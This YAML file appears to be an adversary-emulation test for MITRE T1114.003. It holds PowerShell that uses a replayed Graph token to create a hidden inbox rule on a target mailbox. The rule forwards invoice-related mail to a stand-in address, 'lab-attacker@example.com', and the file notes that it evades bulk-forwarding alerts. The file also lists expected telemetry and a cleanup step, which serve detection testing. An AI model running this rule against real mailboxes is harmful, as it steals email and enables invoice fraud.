attack_technique: T1114.003
display_name: "Post-Exploitation – Email Forwarding Rule (Inbox Rule Exfiltration)"
atomic_tests:
  - name: "Create inbox forwarding rule via Microsoft Graph"
    auto_generated_guid: b4c5d6e7-f8a9-0123-bcde-123456789013
    description: |
      Creates a server-side inbox rule that forwards matching emails to an
      external address. Unlike SMTP forwarding, inbox rules can filter by
      keyword, sender, or subject — enabling targeted intelligence collection.
      Wraps Microsoft.Graph to create the rule via the mailFolders/inbox/messageRules
      API endpoint.
    supported_platforms:
      - windows
      - linux
      - macos
    input_arguments:
      tenant_id:
        description: "Entra tenant ID of the lab tenant."
        type: String
        default: "00000000-0000-0000-0000-000000000000"
      target_user_id:
        description: "User ID or UPN of the mailbox owner."
        type: String
      forwarding_address:
        description: "External email address to forward matching mail to."
        type: String
        default: "lab-attacker@example.com"
      rule_name:
        description: "Display name for the inbox rule."
        type: String
        default: "Tacklebox-Lab-Rule"
      subject_filter:
        description: "Subject keyword that triggers the rule."
        type: String
        default: "invoice"
      token_cache_path:
        description: "Path to a Graph-scoped token cache file."
        type: Path
        default: "#{token_cache_path}"
    executor:
      name: powershell
      command: |
        Import-Module Microsoft.Graph.Mail -ErrorAction Stop
        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
        Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

        $ruleBody = @{
            displayName = '#{rule_name}'
            isEnabled   = $true
            sequence    = 1
            conditions  = @{
                subjectContains = @('#{subject_filter}')
            }
            actions = @{
                forwardTo = @(
                    @{
                        emailAddress = @{
                            address = '#{forwarding_address}'
                        }
                    }
                )
                stopProcessingRules = $true
            }
        }
        New-MgUserMailFolderMessageRule `
            -UserId '#{target_user_id}' `
            -MailFolderId 'inbox' `
            -BodyParameter $ruleBody
    cleanup_command: |
      Import-Module Microsoft.Graph.Mail -ErrorAction Stop
      $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
      Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome
      $rules = Get-MgUserMailFolderMessageRule -UserId '#{target_user_id}' -MailFolderId 'inbox'
      $target = $rules | Where-Object { $_.DisplayName -eq '#{rule_name}' }
      if ($target) {
          Remove-MgUserMailFolderMessageRule -UserId '#{target_user_id}' -MailFolderId 'inbox' -MessageRuleId $target.Id -Confirm:$false
      }
    references:
      - "https://www.proofpoint.com/us/blog/threat-insight/bec-and-supply-chain-compromise"
    auth_profile: "graph-delegated"
    defense_evasion: "Server-side rule persists beyond session; targeted exfiltration evades bulk-forwarding alerts"
    requires_token:
      from: "cookie-replay"
      resource: "https://graph.microsoft.com"
    expected_telemetry:
      - source: ual
        match:
          Operations: "New-InboxRule"
        within_minutes: 15
      - source: graph_audit
        match:
          activityDisplayName: "Add message rule"
        within_minutes: 20
    exercises_chokepoint:
      id: "DC-POSTEX-002"
      url: "https://detectionchokepoints.com/postex/email-rules-exfil"
